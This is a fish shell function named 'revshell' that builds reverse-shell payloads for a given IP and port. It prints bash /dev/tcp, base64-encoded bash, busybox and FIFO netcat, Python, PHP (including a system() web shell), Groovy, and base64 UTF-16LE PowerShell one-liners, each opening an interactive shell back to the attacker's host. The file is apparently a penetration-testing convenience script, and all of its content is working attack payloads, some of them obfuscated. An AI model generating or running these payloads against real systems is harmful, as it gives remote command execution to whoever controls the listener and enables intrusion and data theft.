function revshell --description 'Print reverse-shell one-liners (bash/python/php/nc/powershell base64)'
    if test (count $argv) -lt 2
        echo "Usage: revshell <ip> <port>"
        return 1
    end

    set -l ip $argv[1]
    set -l port $argv[2]

    # Bash reverse shell
    set -l bash_shell "/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"

    # Bash Base64 (no wrapping)
    set -l shell_encode (printf "%s" "$bash_shell" | base64 -w 0)

    # PowerShell TCP reverse shell
    set -l ps_cmd "\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()  "

    # Encode PowerShell as UTF-16LE Base64 (single line)
    set -l ps_base64 (printf "%s" "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

    echo
    # URL Encode Command
    echo -e "[+] Command to URL Encode: jq -nr --arg v \"<COMMAND TO ENCODE>\" '\$v|@uri'"
    echo ---------------------------------------------
    echo "[+] busybox: busybox nc $ip $port -e /bin/bash"
    echo ---------------------------------------------
    echo "[+] Java Runtime().exec: bash -c '$bash_shell'"
    echo ---------------------------------------------
    echo "[+] Bash: $bash_shell"
    echo ---------------------------------------------
    echo "[+] Bash Encoded: echo '$shell_encode' | base64 -d | /usr/bin/bash"
    echo ---------------------------------------------
    echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo ---------------------------------------------
    echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    echo ---------------------------------------------
    echo "[+] PHP simple Revshell: <?php echo system(\"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196\"); ?>"
    echo ---------------------------------------------
    echo "[+] Netcat FIFO: rm /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/bash -i 2>&1 | nc $ip $port"
    echo ---------------------------------------------
    echo "[+] Groovy: String host="$ip";int port=$port;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
    echo ---------------------------------------------
    printf "[+] PowerShell (Base64): powershell -e %s\n" $ps_base64

end
